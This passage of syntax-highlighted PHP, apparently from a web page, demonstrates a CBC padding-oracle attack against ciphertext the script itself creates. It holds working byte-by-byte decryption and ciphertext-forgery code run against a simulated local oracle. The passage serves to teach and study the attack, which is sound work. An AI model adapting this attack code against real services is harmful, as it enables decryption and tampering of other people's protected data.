class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eget_random_bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;PLAINTEXT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;KEY\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;IV\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopenssl_encrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCIPHER\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eOPENSSL_RAW_DATA\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003edie\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Failed to encrypt plaintext.\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;CIPHERTEXT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;key\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;iv\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eoracle_decrypt_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eoracle_encrypt_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ZZZZZZZZZZZZZZZZ\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eoracle_decrypt_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_split\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// We\u0026#39;re going to fiddle with the first block to find bytes in the second\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// block.\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$solved_block\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eoracle_decrypt_attack_block\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ORACLE DECYPT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$solved_block\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eoracle_encrypt_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$evil_plain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_split\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ciphertext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$plain_blocks\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_split\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$head_plain\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plain_blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$tail_plain\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plain_blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$solved_block\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eoracle_encrypt_attack_block\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$tail_plain\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$evil_plain\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ORACLE INPUT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ORACLE ENCRYPT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$solved_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Now, construct the attack text.\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$full_attack\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$blocks\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$full_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$solved_block\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$full_attack\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eimplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$full_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;key\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;iv\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopenssl_decrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$full_attack\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCIPHER\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eOPENSSL_RAW_DATA\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ORACLE ATTACK (RAW)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eprint_section\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ORACLE ATTACK (BYTES)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eoracle_decrypt_attack_block\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Performing oracle decryption attack against target block...\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003earray_fill\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$raw_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// If we\u0026#39;ve already guessed some plaintext bytes, first configure the\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// end of the block to have the right values for those bytes.\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nv\"\u003e$attack_value\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$head_block\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ii\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$attack_value\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Now, guess the last byte, using the padding oracle to verify the value\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// for the plaintext.\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e255\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$raw_value\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pad_value\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n      \u003cspan class=\"nv\"\u003e$ok\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003equery_oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$try_head\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$tail_block\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$oracle\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ok\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n          \u003cspan class=\"s2\"\u003e\u0026quot;Solved byte %d.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n          \u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$byte\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$guess_byte\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Convert the plaintext back to a string and return it.\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eforeach\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ord\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ord\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$result\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan 